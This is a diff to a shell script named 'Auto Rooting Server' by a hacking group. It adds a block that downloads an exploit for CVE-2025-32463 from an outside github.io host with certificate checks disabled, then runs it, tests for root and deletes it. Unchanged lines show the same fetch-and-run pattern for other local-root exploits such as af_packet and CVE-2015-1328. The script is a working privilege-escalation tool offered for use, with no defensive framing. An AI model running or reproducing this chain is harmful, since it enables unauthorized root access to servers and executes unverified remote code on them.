@@ -4,7 +4,7 @@ RED='\033[91m'
 ENDCOLOR='\033[0m'
 
 echo "***************************************************************"
-echo -e "${RED}Auto Rooting Server By: ðŸ’€ Ghosthaxor - Team Rokes 315ðŸ’€${ENDCOLOR}"
+echo -e "${RED}Auto Rooting Server By: * Ghosthaxor - Team Rokes 315ðŸ’€${ENDCOLOR}"
 echo -e "${RED}Blog: https://www.xploit.info${ENDCOLOR}"
 echo "***************************************************************"
 
@@ -97,6 +97,12 @@ chmod 777 "af_packet"
 ./af_packet
 check_root
 rm "af_packet"
+
+wget -q "https://mrwawanj.github.io/localroot/CVE-2025-32463.sh" --no-check-certificate
+chmod 777 "CVE-2025-32463.sh"
+./CVE-2025-32463.sh
+check_root
+rm "CVE-2025-32463.sh"
 
 wget -q "https://mrwawanj.github.io/localroot/CVE-2015-1328" --no-check-certificate
 chmod 777 "CVE-2015-1328"
